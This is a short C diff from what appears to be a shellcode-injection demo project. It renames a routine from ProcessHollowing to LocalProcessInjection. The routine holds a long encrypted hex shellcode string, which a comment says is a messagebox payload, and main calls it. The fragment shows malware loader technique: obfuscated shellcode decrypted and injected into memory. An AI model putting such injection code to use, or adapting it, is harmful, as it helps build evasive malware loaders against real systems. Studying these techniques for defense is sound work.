@@ -71,7 +71,7 @@ void free_obfuscated(void *ptr) {
 
 
 // The shellcode here is the encrytped messagebox shellcode from the previous code
-void ProcessHollowing() {
+void LocalProcessInjection() {
     const char* encrypted_hex = "92dcccd392e9e0da9bfdf9e2c2c7d2c9c8eee2e5d2edf2e5dddec8e5ddd9c8e5e3ded8e5dfd8f2e5e7dbd9e1fef9e9cbeee0f9e38581ffded892cedafbf8cdffe1f8cdecfaf9def39ec6cdfafef8cdd0f8f0f9c39ccbe3fbd8cbe2e5f0dc9cc985cbf9f085fac8fccef9e0f9ced298e7f0d2dfc39bfdcd98fbf2d9939ce8cdd0fbf0f9c3ebc6c2e4e29ccdd0f9f0f9c3d8cee2e5f0dcd8fbe3f2e0d2e8d2e6c8f2f2c7ecd8dceefbcec4d8e6edde99c2ecccd8df85858585d8ececfccc9d99e89cc7e6f9f9f2e3e29ef89985858581fbe3e0d9c6d3fecedee0eedecbe4d89fdad0f9efcbebe9f8ce929cd9d2fbf0c0fb9fc5d385efe0e2fbcec5f299c0fafbe7cff8d2d2fbffe5c6e98585858592d9c2d392c9e8e4ddccf8e9f2e0fdd8dce7c6dcfee3e8f8fdf9fbd8fccedaf0c6c7d9e4ddfbc0e0ffe7e3eccf85e0e4d2f3e08593ecf8";
     
   int hex_len = strlen(encrypted_hex) / 2;
@@ -136,6 +136,6 @@ void ProcessHollowing() {
 }
 
 int main() {
-    ProcessHollowing();
+    LocalProcessInjection();
     return 0;
 }
